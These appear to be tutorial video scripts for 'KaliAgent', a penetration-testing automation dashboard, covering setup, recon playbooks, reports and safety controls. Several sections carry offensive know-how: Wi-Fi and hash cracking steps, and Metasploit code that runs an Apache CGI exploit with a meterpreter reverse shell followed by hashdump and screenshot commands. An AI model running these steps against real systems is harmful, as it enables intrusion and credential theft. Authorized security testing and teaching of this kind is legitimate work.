# KaliAgent Video Tutorial Scripts

Complete video tutorial scripts with real demo examples.

---

## Table of Contents

1. [Getting Started (5 min)](#video-1-getting-started)
2. [First Engagement (10 min)](#video-2-first-engagement)
3. [Advanced Playbooks (15 min)](#video-3-advanced-playbooks)
4. [PDF Reports (8 min)](#video-4-pdf-reports)
5. [Safety Controls (10 min)](#video-5-safety-controls)
6. [Metasploit Integration (12 min)](#video-6-metasploit-integration)

---

## Video 1: Getting Started (5 minutes)

### Title: "KaliAgent Quick Start - Install & Run in 5 Minutes"

### Thumbnail
- KaliAgent logo
- Text: "5-Minute Setup"
- Background: Dashboard screenshot

### Script

**[0:00 - 0:15] Intro**

```
[VISUAL: KaliAgent dashboard rotating 3D]
[MUSIC: Upbeat tech intro]

NARRATOR:
"Want to automate your security assessments? 
In this video, I'll show you how to install and run KaliAgent 
in just 5 minutes."

[TEXT OVERLAY: "KaliAgent Quick Start"]
```

**[0:15 - 0:45] What is KaliAgent?**

```
[VISUAL: Screen recording of dashboard]

NARRATOR:
"KaliAgent is a professional security automation platform with:
- 52 Kali Linux tools pre-configured
- 5 automated playbooks for common assessments
- A beautiful web dashboard
- Professional PDF reports

Let's get it running!"
```

**[0:45 - 2:00] Installation**

```
[VISUAL: Terminal window, typing commands]

NARRATOR:
"First, clone the repository and install dependencies."

[ON-SCREEN COMMANDS - Type these out slowly]

git clone https://github.com/wezzels/agentic-ai.git
cd agentic-ai/kali_dashboard

# Install Python dependencies
pip install fastapi uvicorn pydantic reportlab matplotlib

# Install frontend
cd frontend
npm install

[VISUAL: Progress bars filling]

NARRATOR:
"This installs all the required packages. 
Should take about 2 minutes."
```

**[2:00 - 3:00] Start Services**

```
[VISUAL: Terminal showing startup logs]

NARRATOR:
"Now let's start the backend and frontend."

# Terminal 1 - Backend
cd ..
python3 server.py

[VISUAL: Shows "Uvicorn running on http://0.0.0.0:8001"]

NARRATOR:
"Backend is running on port 8001.
Now the frontend..."

# Terminal 2 - Frontend
cd frontend
npm run dev

[VISUAL: Shows "Local: http://localhost:5173"]

NARRATOR:
"Perfect! Both services are running."
```

**[3:00 - 4:00] First Look at Dashboard**

```
[VISUAL: Browser opening to localhost:5173]

NARRATOR:
"Open your browser to localhost:5173...
And there it is! The KaliAgent dashboard."

[VISUAL: Mouse hovering over different sections]

NARRATOR:
"Here you can see:
- Your stats overview
- Recent engagements
- Quick actions
- And navigation to all features"

[VISUAL: Click on Tools tab]

NARRATOR:
"Let's check the tools... 52 Kali tools, all ready to use!"
```

**[4:00 - 4:45] Quick Test**

```
[VISUAL: Navigate to Playbooks]

NARRATOR:
"Let's do a quick test with the Reconnaissance playbook."

[VISUAL: Fill in form]

Target: scanme.nmap.org
Domain: scanme.nmap.org

[VISUAL: Click Execute]

NARRATOR:
"This is a safe test target provided by Nmap.org.
Watch the live execution..."

[VISUAL: Live monitor showing tools executing]

NARRATOR:
"Nmap scanning... theHarvester collecting emails...
All automated!"
```

**[4:45 - 5:00] Outro**

```
[VISUAL: Dashboard with completed execution]

NARRATOR:
"And that's it! KaliAgent is up and running.
In the next video, we'll create your first full engagement.

Don't forget to like and subscribe!"

[TEXT OVERLAY: "Next: First Engagement"]
[END SCREEN: Subscribe button + Next video]
```

---

## Video 2: First Engagement (10 minutes)

### Title: "Create Your First Security Assessment | KaliAgent Tutorial"

### Thumbnail
- Engagement wizard screenshot
- Text: "Step-by-Step Guide"
- Green checkmark

### Script

**[0:00 - 0:30] Intro**

```
[VISUAL: Dashboard overview]

NARRATOR:
"Welcome back! In this video, we'll create your first 
complete security engagement from start to finish.

By the end, you'll have:
- A configured engagement
- Executed playbooks
- A professional PDF report

Let's dive in!"
```

**[0:30 - 2:00] Step 1: Create Engagement**

```
[VISUAL: Click "New Engagement" button]

NARRATOR:
"First, click 'New Engagement' in the top right.

This opens the engagement wizard."

[VISUAL: Fill in engagement form]

Name: "Q2 2026 External Assessment"
Type: "Penetration Test"
Start Date: Today
End Date: +1 week

NARRATOR:
"Give it a descriptive name, select the type, 
and set your testing window."

[VISUAL: Add targets]

Scope:
- example.com
- 203.0.113.0/24

NARRATOR:
"Add your targets. These are the systems you have 
authorization to test.

IMPORTANT: Only scan systems you own or have 
written permission for!"

[VISUAL: Add objectives]

Objectives:
- Identify external vulnerabilities
- Test web application security
- Validate firewall rules

NARRATOR:
"Define clear objectives. This helps focus your testing."

[VISUAL: Click Create]

NARRATOR:
"Click Create, and your engagement is ready!"
```

**[2:00 - 4:00] Step 2: Configure Safety**

```
[VISUAL: Navigate to Settings > Safety Controls]

NARRATOR:
"Before we start scanning, let's configure safety controls."

[VISUAL: Configure IP Whitelist]

IP Whitelist:
example.com
203.0.113.0/24

NARRATOR:
"The whitelist ensures we ONLY scan approved targets.
If we accidentally try to scan something else, it will be blocked."

[VISUAL: Configure IP Blacklist]

IP Blacklist:
8.8.8.8
1.1.1.1
192.168.1.1

NARRATOR:
"The blacklist blocks specific IPs no matter what.
I always add DNS servers and gateways here."

[VISUAL: Set Authorization Level]

Authorization: BASIC

NARRATOR:
"For recon, BASIC level is perfect.
It allows scanning tools but blocks exploitation."

[VISUAL: Enable Audit Logging]

NARRATOR:
"And enable audit logging for compliance.
Everything we do will be recorded."
```

**[4:00 - 7:00] Step 3: Execute Playbook**

```
[VISUAL: Navigate to Playbooks tab]

NARRATOR:
"Now for the fun part - executing playbooks!"

[VISUAL: Select "Comprehensive Reconnaissance"]

NARRATOR:
"We'll start with Comprehensive Reconnaissance.
This runs 5 tools automatically:"

[TEXT OVERLAY as each is mentioned]
- Nmap (port scanning)
- theHarvester (email harvest)
- Amass (subdomain enumeration)
- DNSrecon (DNS records)
- Nikto (web server scan)

[VISUAL: Fill in parameters]

Target: example.com
Domain: example.com

NARRATOR:
"Enter your target and domain, then click Execute."

[VISUAL: Live Monitor page opens]

NARRATOR:
"The Live Monitor shows real-time execution.
Watch as each tool runs..."

[VISUAL: Tools executing one by one]

[10:23:45] Nmap → Port scan (1-10000) ✅
[10:24:12] theHarvester → Email/subdomain harvest ✅
[10:24:45] Amass → Subdomain enumeration ✅
[10:25:18] DNSrecon → DNS records ✅
[10:25:52] Nikto → Web server scan ✅

NARRATOR:
"Each tool shows its progress, output, and any findings.
This took about 2 minutes in dry-run mode.
Real execution would take 45-90 minutes."
```

**[7:00 - 8:30] Step 4: Review Findings**

```
[VISUAL: Navigate to Engagements > Q2 2026]

NARRATOR:
"Once complete, let's review the findings."

[VISUAL: Show findings list]

NARRATOR:
"We found:
- 3 open ports (22, 80, 443)
- 5 subdomains discovered
- 2 email addresses found
- 1 Nikto finding (missing security headers)

Click on any finding for details..."

[VISUAL: Expand a finding]

NARRATOR:
"Each finding includes:
- Severity rating
- Description
- Evidence
- Remediation steps"
```

**[8:30 - 9:30] Step 5: Generate Report**

```
[VISUAL: Click "Generate Report" button]

NARRATOR:
"Now let's create a professional PDF report."

[VISUAL: Select PDF format]

Format: PDF
Include Charts: Yes
Include Executive Summary: Yes

[VISUAL: Report generating animation]

NARRATOR:
"The report includes:
- Executive summary
- Findings pie chart
- Tool execution table
- Detailed findings
- Recommendations"

[VISUAL: Open generated PDF]

NARRATOR:
"Look at that! Professional quality, ready for 
executives or clients."
```

**[9:30 - 10:00] Outro**

```
[VISUAL: Dashboard with completed engagement]

NARRATOR:
"And that's your first complete engagement!

You've learned to:
✅ Create an engagement
✅ Configure safety controls
✅ Execute playbooks
✅ Review findings
✅ Generate professional reports

Next up: Advanced playbooks for web apps and password auditing.

See you there!"

[END SCREEN: Next video + Subscribe]
```

---

## Video 3: Advanced Playbooks (15 minutes)

### Title: "Advanced Security Testing | Web Apps, Password Cracking & More"

### Script Highlights

**[0:00 - 1:00] Intro**
- Recap of basic recon
- Preview of advanced playbooks

**[1:00 - 5:00] Web Application Audit**

```
[VISUAL: Select Web Audit playbook]

NARRATOR:
"Web Audit runs 5 specialized tools:"

Tools:
- Gobuster (directory brute-force)
- Nikto (web vulnerabilities)
- WPScan (WordPress audit)
- SQLMap (SQL injection)
- SSLScan (TLS configuration)

[VISUAL: Execute against testphp.vulnweb.com]

Target: testphp.vulnweb.com

NARRATOR:
"This is a intentionally vulnerable test site.
Perfect for learning!"

[VISUAL: Show findings as they appear]

FINDINGS:
🔴 CRITICAL: SQL Injection in login form
🟠 HIGH: Directory listing enabled
🔵 MEDIUM: Missing X-Frame-Options
🟢 LOW: Server version disclosed

NARRATOR:
"SQLMap found a SQL injection vulnerability!
This could allow attackers to access your database."
```

**[5:00 - 9:00] Password Cracking**

```
[VISUAL: Select Password Audit playbook]

NARRATOR:
"Password auditing tests credential strength."

[VISUAL: Create sample hash file]

# Create test hashes
echo 'admin:$1$salt$hashed_password' > hashes.txt

[VISUAL: Configure playbook]

Hash File: /path/to/hashes.txt
Wordlist: /usr/share/wordlists/rockyou.txt

[VISUAL: Execute]

NARRATOR:
"John the Ripper and Hashcat work together to crack passwords.
This can take minutes to hours depending on complexity."

[VISUAL: Results appear]

CRACKED:
admin:password123 ✅
user:letmein ✅

NARRATOR:
"Two passwords cracked!
This shows why strong passwords matter."
```

**[9:00 - 13:00] Wireless Audit**

```
[VISUAL: Select Wireless Audit playbook]

NARRATOR:
"Wireless auditing tests WiFi security."

[VISUAL: Put interface in monitor mode]

sudo airmon-ng start wlan0

[VISUAL: Execute playbook]

Interface: wlan0mon
Target BSSID: AA:BB:CC:DD:EE:FF

Tools:
- Kismet (detect networks)
- Wifite (automated audit)
- Aircrack-ng (WPA crack)
- Reaver (WPS attack)

[VISUAL: Capture handshake]

NARRATOR:
"Wifite captured a WPA handshake!
Now Aircrack attempts to crack it..."

[VISUAL: Password cracked]

CRACKED: MySecureWiFi123

NARRATOR:
"The password was cracked in 3 minutes.
This is why WPA2 with long passwords is essential."
```

**[13:00 - 15:00] Summary & Best Practices**

```
[VISUAL: Comparison table]

Playbook | Duration | Risk | Authorization
---------|----------|------|--------------
Recon    | 45-90m   | Low  | BASIC
Web Audit| 60-120m  | Med  | ADVANCED
Password | 30m-24h  | Med  | ADVANCED
Wireless | 30-90m   | High | ADVANCED

NARRATOR:
"Each playbook serves different purposes.
Choose based on your engagement goals.

Remember: Always get proper authorization!"

[END SCREEN: Next video + Resources]
```

---

## Video 4: PDF Reports (8 minutes)

### Title: "Professional Security Reports | PDF Generation Tutorial"

### Script Highlights

**[0:00 - 1:00] Why Reports Matter**

```
[VISUAL: Side-by-side: Raw output vs Professional PDF]

NARRATOR:
"Raw tool output is technical and hard to read.
Executive reports need to be clear, visual, and actionable."
```

**[1:00 - 3:00] Report Components**

```
[VISUAL: Annotated PDF report]

1. Title Page
   - Engagement name
   - Date
   - Classification

2. Executive Summary
   - High-level overview
   - Risk level
   - Key findings

3. Findings Chart
   - Visual breakdown by severity

4. Detailed Findings
   - Each vulnerability explained
   - Remediation steps

5. Recommendations
   - Prioritized action items
```

**[3:00 - 6:00] Generate Report Live**

```
[VISUAL: Navigate to engagement]

NARRATOR:
"Let's generate a report from our Q2 assessment."

[VISUAL: Click Generate Report]

Format: PDF
Include Charts: Yes
Include Screenshots: Yes

[VISUAL: Report generation progress]

NARRATOR:
"The report generator:
- Collects all findings
- Creates charts with Matplotlib
- Formats everything professionally
- Adds your branding"

[VISUAL: PDF opens]

NARRATOR:
"Look at this! Professional quality with:
- Color-coded severity badges
- Pie chart showing risk distribution
- Tool execution summary
- Detailed technical findings
- Clear remediation steps"
```

**[6:00 - 8:00] Customize Reports**

```
[VISUAL: Settings > Reports]

NARRATOR:
"You can customize reports in Settings."

Options:
- Company logo
- Color scheme
- Executive summary template
- Recommendation templates
- Email delivery

[VISUAL: Upload logo]

NARRATOR:
"Add your company logo for client reports."

[VISUAL: Configure email]

NARRATOR:
"Set up automatic email delivery to stakeholders."

[END SCREEN: Templates available in description]
```

---

## Video 5: Safety Controls (10 minutes)

### Title: "Safe Security Testing | Authorization & Safety Features"

### Script Highlights

**[0:00 - 2:00] Why Safety Matters**

```
[VISUAL: News headlines about unauthorized scanning]

NARRATOR:
"Unauthorized scanning can lead to:
- Criminal charges
- Civil lawsuits
- System damage
- Job loss

KaliAgent has multi-layer safety controls."
```

**[2:00 - 5:00] IP Whitelist/Blacklist**

```
[VISUAL: Configure whitelist]

NARRATOR:
"The whitelist ensures you ONLY scan approved targets."

[VISUAL: Try to scan non-whitelisted IP]

Target: 8.8.8.8
Result: ❌ BLOCKED - Not in whitelist

NARRATOR:
"Execution blocked! This prevents accidental scans."

[VISUAL: Configure blacklist]

NARRATOR:
"The blacklist blocks specific IPs no matter what.
I always add:
- DNS servers (8.8.8.8, 1.1.1.1)
- Emergency services
- Critical infrastructure"

[VISUAL: Try to scan blacklisted IP]

Target: 192.168.1.1 (blacklisted)
Result: ❌ BLOCKED - Target is blacklisted

NARRATOR:
"Blacklist takes precedence over whitelist.
Double protection!"
```

**[5:00 - 8:00] Authorization Levels**

```
[VISUAL: Authorization level selector]

NONE → BASIC → ADVANCED → CRITICAL

NARRATOR:
"Four authorization levels control tool access."

[VISUAL: Try to run Metasploit with BASIC auth]

Tool: Metasploit
Auth: BASIC
Result: ❌ BLOCKED - CRITICAL authorization required

NARRATOR:
"Metasploit requires CRITICAL level.
This prevents accidental exploitation."

[VISUAL: Authorization workflow diagram]

NARRATOR:
"Each level requires appropriate approval:
- BASIC: Standard authorization form
- ADVANCED: Management approval
- CRITICAL: Executive + Legal review"
```

**[8:00 - 10:00] Audit Logging**

```
[VISUAL: Open audit log file]

NARRATOR:
"Every action is logged for compliance."

[VISUAL: Show log entries]

{
  "timestamp": "2026-04-18T01:23:45Z",
  "user": "admin",
  "tool": "nmap",
  "target": "192.168.1.100",
  "command": "nmap -sV 192.168.1.100",
  "exit_code": 0,
  "duration": 45.3
}

NARRATOR:
"Logs include:
- Who ran what
- Against which target
- When it happened
- What the result was

Essential for PCI-DSS, HIPAA, and SOC 2 compliance!"

[END SCREEN: Download authorization template]
```

---

## Video 6: Metasploit Integration (12 minutes)

### Title: "Metasploit Automation | Advanced Exploitation with KaliAgent"

### Script Highlights

**[0:00 - 2:00] What is Metasploit RPC?**

```
[VISUAL: Metasploit logo + diagram]

NARRATOR:
"Metasploit RPC allows programmatic control 
of the Metasploit Framework.

KaliAgent integrates fully with:
- Database synchronization
- Exploit execution
- Session management
- Post-exploitation modules"
```

**[2:00 - 5:00] Setup Metasploit**

```
[VISUAL: Start PostgreSQL]

sudo systemctl start postgresql
sudo -u postgres msfdb init

[VISUAL: Start msfrpcd]

msfrpcd -P mypassword -a 127.0.0.1 -p 55553

[VISUAL: Configure in KaliAgent]

Settings > Metasploit DB
Host: 127.0.0.1
Port: 55553
Password: mypassword

[VISUAL: Test connection]

Result: ✅ Connected

NARRATOR:
"Connection successful! Now we can use 
all Metasploit features."
```

**[5:00 - 9:00] Import Nmap & Exploit**

```
[VISUAL: Run Nmap scan]

nmap -sV -oA scan.xml 192.168.1.100

[VISUAL: Import into Metasploit]

agent.msfrpc.import_nmap("scan.xml")

[VISUAL: View hosts in database]

Hosts:
- 192.168.1.100
  - Port 22: SSH
  - Port 80: Apache 2.4.41
  - Port 443: Apache 2.4.41

[VISUAL: Search for exploits]

modules = agent.get_metasploit_modules("exploit")
apache_exploits = [m for m in modules if "apache" in m]

NARRATOR:
"Found 15 Apache exploits!
Let's try one..."

[VISUAL: Execute exploit]

result = agent.execute_metasploit_exploit(
    exploit="exploit/multi/http/apache_mod_cgi_bash_env_exec",
    payload="linux/x86/meterpreter/reverse_tcp",
    target="192.168.1.100"
)

[VISUAL: Session opened]

Session opened: 1 (meterpreter)

NARRATOR:
"Session opened! We now have a Meterpreter shell."
```

**[9:00 - 12:00] Post-Exploitation**

```
[VISUAL: Run post modules]

# Get system info
agent.metasploit_session_command("1", "sysinfo")

# Dump passwords
agent.metasploit_session_command("1", "hashdump")

# Screenshot
agent.metasploit_session_command("1", "screenshot")

[VISUAL: Show results]

NARRATOR:
"We've gathered:
- System information
- Password hashes
- Desktop screenshot

All automated through KaliAgent!"

[VISUAL: Generate report]

NARRATOR:
"All findings automatically added to 
the engagement report."

[END SCREEN: Advanced course link]
```

---

## Production Tips

### Recording Setup

**Software:**
- OBS Studio (screen recording)
- Audacity (audio editing)
- DaVinci Resolve (video editing)

**Settings:**
- Resolution: 1920x1080
- FPS: 30
- Bitrate: 6000 kbps
- Audio: 48kHz, 128kbps

### Terminal Setup

```bash
# Use large font
export FONT_SIZE=14

# Use high-contrast theme
echo 'export PS1="\[\e[32m\]\u@\h:\w\$ \[\e[0m\]"' >> ~/.bashrc

# Record terminal
script -c "bash" terminal_recording.txt
```

### Best Practices

1. **Script Everything** - Don't improvise
2. **Test Commands** - Run through before recording
3. **Use Test Targets** - scanme.nmap.org, testphp.vulnweb.com
4. **Keep it Snappy** - Speed up slow parts in editing
5. **Add Captions** - Accessibility matters
6. **Include Timestamps** - In video description

---

## Video Resources

### Test Targets (Legal to Scan)

| Target | Purpose | URL |
|--------|---------|-----|
| **scanme.nmap.org** | Nmap testing | Provided by Nmap |
| **testphp.vulnweb.com** | Web app testing | Acunetix |
| **dvwa.co.uk** | Vulnerable web app | Download & host |
| **metasploitable** | Vulnerable VM | Download & host |

### Thumbnail Templates

- Canva: Free design tool
- Size: 1280x720
- Include: Logo + Text + Screenshot
- Colors: Match KaliAgent theme

### Description Template

```markdown
🔐 KaliAgent Tutorial: [Video Title]

In this video, you'll learn how to [brief description].

⏱️ Timestamps:
0:00 - Intro
1:00 - [Topic 1]
3:00 - [Topic 2]
5:00 - [Topic 3]

📚 Resources:
- Documentation: https://github.com/wezzels/agentic-ai
- Test Target: scanme.nmap.org
- Discord: https://discord.gg/clawd

⚠️ Legal Notice:
Only scan systems you own or have written authorization for.

#KaliAgent #Security #PenetrationTesting #CyberSecurity
```

---

*Last Updated: April 18, 2026*
*Version: 1.0.0*
